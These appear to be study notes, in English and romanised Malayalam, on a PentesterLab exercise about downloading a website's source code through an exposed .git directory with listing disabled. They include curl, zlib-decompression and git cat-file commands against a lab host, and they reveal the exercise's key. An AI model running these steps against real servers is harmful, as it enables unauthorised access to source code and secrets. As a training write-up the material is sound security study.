## Introduction
-->This exercise details how to retrieve information from an exposed .git directory on a web server. This time, the directly listing is disabled
-->In this exercise we are going to cover the exploitation of a website that leaks its `.git` repository in the root of the website.
-->With modern URL mapping (i.e. not relying on the filesystem), it's far less common to encounter these kinds of issues, but it's always important to be on the lookout for them.

## Exploitation
-->Here, we can access the `.git` directory in the root of the web server directly.
-->We can see that this time directory listing is disabled, making the task of retrieving the content of the repository a bit more difficult.
-->First, we can recover some files:
-   `.git/config`.
-   `.git/HEAD`.
-->From `.git/HEAD`, we can see that the `HEAD` is at `refs/heads/master`.
-->We can therefore access the file: `.git/refs/heads/master`.
-->From that file, we get a hash: `bc4f01bdd14060e4ac78b36972584909d287b6f1`.
-->This will link us to another file: `.git/objects/bc/4f01bdd14060e4ac78b36972584909d287b6f1` (by using the first two bytes as a directory's name and the rest as the file's name).
-->Once you download the file, you will need to decompress it. The compression is done using `zlib`.
-->Unfortunately, most systems don't have a native tool to decompress zlib-compressed files.
-->You can either use `gzip`:
```bash
printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" |cat - 4f01bdd14060e4ac78b36972584909d287b6f1 |gzip  -cd -q
```
-->or `ruby` (for example):
```rust
ruby -rzlib -e 'print Zlib::Inflate.new.inflate(STDIN.read)' < 4f01bdd14060e4ac78b36972584909d287b6f1
```
-->From there, we get a new commit that we can download, and from there, check the content by deflating it and running `strings -a` on the result:
```
$ ruby -rzlib -e 'print Zlib::Inflate.new.inflate(STDIN.read)' < ace0476093d04023f84d7816adacfa7b879c43 | strings -a
	 
	tree 182
	40000 css
	100644 favicon.ico
	s100644 footer.php
	3100644 header.php
	100644 index.php
```
-->Unfortunately, using `strings` does not give us the hash for each file. However, what ee can do is create our own local repo:
```
$ mkdir /tmp/hack
$ cd /tmp/hack
$ git init 
```
-->And copy our files to it:
```
	$ mkdir -p .git/objects/58 .git/objects/bc
	$ cp /tmp/ace0476093d04023f84d7816adacfa7b879c43 /tmp/hack/.git/objects/58/
	$ cp /tmp/4f01bdd14060e4ac78b36972584909d287b6f1 /tmp/hack/.git/objects/bc/
```
-->Then we should be able to retrieve the list of hashes:
```
	% git cat-file -p 58ace0476093d04023f84d7816adacfa7b879c43
	040000 tree b352dde43705f193d2c1d4e6f6a133321186869f    css
	100644 blob f303c6a7797f5e7a0d5bd31d39a7149366bbf873    favicon.ico
	100644 blob 5adab1a1c52dc009d4f26bbce30dacc4c93eea33    footer.php
	100644 blob c3646db7f9c7e6f126c75900fdcce16d50e1da82    header.php
	100644 blob 88beb94b5e1fc48e1625c89f892b04bffb58225c    index.php
```
-->Once you're there, you can keep downloading and copying the files to the right spot, in order to get access to the full code using `git cat-file -p ...`
-->Some tools like [Git-Money](https://github.com/dnoiz1/git-money), [DVCS-Pillage](https://github.com/evilpacket/DVCS-Pillage) and [GitTools](https://github.com/internetwache/GitTools) automate the retrieval of the remote content.
-->With this information, you should be able to find the key to solve this exercise, which is hidden in a `PHP` comment of one of the `.php` files.

## Conclusion
-->This exercise showed you how you can download the source code of a website, if the `.git` repository is exposed.

# Video Explanation
## Video - exploitation
-->lab open aakuka enit url il /.git/ enn kodukuka apol namuk forbidden enn kitum
-->forbidden enn kandathkond nirtharuth.chelapo namuk git access chyan patumayirikum but directory indexing aayirikum forbidden aayit kanikunath
-->so url il /.git/HEAD   enn kodukuka apol page il : `ref: refs/heads/master`   enn kanikum
-->so ith .git/ inte koode itt search chyuka ->ptl-4cf1559b-ebdad755.libcurl.so/.git/refs/heads/master
-->apol namuk oru hash kitum.ath git commit chyumbol namuk kituna hash aanen thonunu.->`59adb37be0c3c90e185e9bd2ce930c57a8b7d6beso` 
-->so ath copy chyth url il kodukanam ie, /objects/59adb37be0c3c90e185e9bd2ce930c57a8b7d6be   enn kodukanam enit send adichal onum aakila pakarnam ee hash inte aadyathe rand number in shesham oru slash itt hash split chyanam enit send adikumbol athinte file namuk kitum ie,
->http://ptl-4cf1559b-ebdad755.libcurl.so/.git/objects/59/adb37be0c3c90e185e9bd2ce930c57a8b7d6be
-->ipol namuk file kitum so ath download chyuka enit ini namuk terminal aavisham aan.so terminalil poi ->git init adikuka
-->`Initialized empty Git repository in /root/Documents/pentesterlab/blue/gitleadII/.git/`    en kanikum.
-->ini namal ->ls .git/objects ennadichal athinte ullil enthoke und en manasilakum
-->ini namuk aa hashstring ee objects enna directory il aakam.ivide hash thodangunath 59 il aan.so directory undakumbol 59 enn idanam.
-->adyam .git directory il ninum purath varuka.then :
->`mkdir .git/objects/59/ && curl ptl-4cf1559b-ebdad755.libcurl.so/.git/objects/59/adb37be0c3c90e185e9bd2ce930c57a8b7d6be -o .git/objects/59/adb37be0c3c90e185e9bd2ce930c57a8b7d6be`
-->ivide adyam namal 59 enna directory objects enna direcotry il aakunu.enit ee hash string athilek aakunu.ipol namal aa string 59 enna directory il aaki.ini namuk ith cat chyam.cat chyumbol 59 in shesham slash idaruth ok:
->`git cat-file -p 59adb37be0c3c90e185e9bd2ce930c57a8b7d6be`
```bash
tree 58ace0476093d04023f84d7816adacfa7b879c43
author Louis Nyffenegger <louis@pentesterlab.com> 1669991111 +0000
committer Louis Nyffenegger <louis@pentesterlab.com> 1669991111 +0000
```
-->ipol namuk ingane result kitum.ivide tree enn ezhuthiyath nok.ini aa commit hash string namuk edukam.enit nerthe pole chyam ok
->`mkdir .git/objects/58/ && curl ptl-4cf1559b-ebdad755.libcurl.so/.git/objects/58/ace0476093d04023f84d7816adacfa7b879c43 -o .git/objects/58/ace0476093d04023f84d7816adacfa7b879c43`
-->ipol namal aa puthya hash vech veendum chyuthu.ini aa 58 enn object inte ulllile directory read chyam(ithum .git diretoy inte purath ninu aan chyunath ok) :
->`git cat-file -p 58ace0476093d04023f84d7816adacfa7b879c43`
```bash
040000 tree b352dde43705f193d2c1d4e6f6a133321186869f    css
100644 blob f303c6a7797f5e7a0d5bd31d39a7149366bbf873    favicon.ico
100644 blob 5adab1a1c52dc009d4f26bbce30dacc4c93eea33    footer.php
100644 blob c3646db7f9c7e6f126c75900fdcce16d50e1da82    header.php
100644 blob 88beb94b5e1fc48e1625c89f892b04bffb58225c    index.php
```
-->ingane kitum.so ithil namuk vendunath eduth nokam.so index.php nokam
->`mkdir .git/objects/88/ && curl ptl-4cf1559b-ebdad755.libcurl.so/.git/objects/88/beb94b5e1fc48e1625c89f892b04bffb58225c -o .git/objects/88/beb94b5e1fc48e1625c89f892b04bffb58225c`
-->`git cat-file -p 88beb94b5e1fc48e1625c89f892b04bffb58225c`
-->ignane chyth nokumbol kituna source code il prathyekich onum ila.so ini namuk header.php nokam:
->`mkdir .git/objects/c3/ && curl ptl-4cf1559b-ebdad755.libcurl.so/.git/objects/c3/646db7f9c7e6f126c75900fdcce16d50e1da82 -o .git/objects/c3/646db7f9c7e6f126c75900fdcce16d50e1da82`
-->ipol namal objects directory il c3 enna puthiya directory aak athil aan ee commit string save chyunath ok.ini ith read chyam :
->`git cat-file -p c3646db7f9c7e6f126c75900fdcce16d50e1da82`
```php
<?php 
  // The KEY IS: 7a56a0cc-f042-4b43-97de-d4427197e8fa
  date_default_timezone_set('UTC');
?>
<!-- PentesterLab --> 
<html>
    <head>
        <title>...........
        ..........
```
-->so ivide ee source code il ninum namuk venda key kitunund.ok
-->ithipo namal manually aan chythath.but pala tools und athoke vech automate chythal namuk peten ella commitsilum chythath peten kanan patum.
-->==NOTE : ivide namal ee chythathoke .git enna file aakitan ie,git init command vech ok.pakshe namal orikal polum ee .git file inte ullil kerunila.aake chyunath ls .git/objects  enna directory undon nokuka mathram aan.karanam athil aan oro commit string um add chyunath ok==
-->so first namal head il ninum aadyathe hash string eduthu.enit ath namal namude machine il save chythu oru file aayit.enit git command vech namal athinte ullilek keri.enit avide vech namal aduthe hash string kandupidichu angane anagen namal matu hash string kandupidich source code il keri key kandethunu ok.athayath oro commit kitunthorum kooduthal info kitum anagne namal key kandethunu

